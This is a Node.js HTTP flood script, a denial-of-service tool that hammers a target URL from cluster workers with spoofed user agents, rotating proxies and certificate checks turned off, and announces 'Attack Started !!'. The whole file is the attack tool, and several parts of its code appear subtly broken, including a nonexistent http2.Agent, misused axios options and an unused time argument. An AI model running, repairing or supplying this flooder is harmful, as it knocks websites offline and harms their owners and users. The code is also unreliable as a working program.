const net = require('net');
const http2 = require('http2');
const cluster = require('cluster');
const url = require('url');
const crypto = require('crypto');
const fakeua = require('fakeua');
const fs = require('fs');
const axios = require('axios');

const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const proxyfile = process.argv[6];

// Load proxies from file
let proxies = fs.readFileSync(proxyfile, 'utf8').split('\n');

// Function to make a request
async function makeRequest() {
    const parsedTarget = url.parse(target);

    // Use HTTP/2 if supported
    const agent = parsedTarget.protocol === 'https:' ? new http2.Agent() : undefined;

    // Set accept header
    const headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'User-Agent': fakeua.generate(),
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    };

    // Configure TLS options
    const tlsOptions = {
        secure: true,
        alpnProtocol: 'http/1.1',
        ciphers: 'AES128-GCM-SHA256',
        ecdhCurve: 'auto',
        host: parsedTarget.host,
        rejectUnauthorized: false,
        servername: parsedTarget.host,
        secureProtocol: 'TLSv1_2_method'
    };

    // Make the request
    const response = await axios.get(target, {
        httpsAgent: agent,
        headers: headers,
        proxy: proxies[Math.floor(Math.random() * proxies.length)],
        tlsOptions: tlsOptions
    });

    console.log(response.status, response.statusText);
}

// Attack loop
function attackLoop() {
    setInterval(() => {
        makeRequest().catch(err => console.error(err));
    }, 1000 / ratelimit);
}

// Main function
if (cluster.isMaster) {
    // Fork workers
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died`);
    });

    console.log('Attack Started !!'); // Ketika memulai serangan
    attackLoop();
} else {
    console.log(`Worker ${process.pid} started`);
}
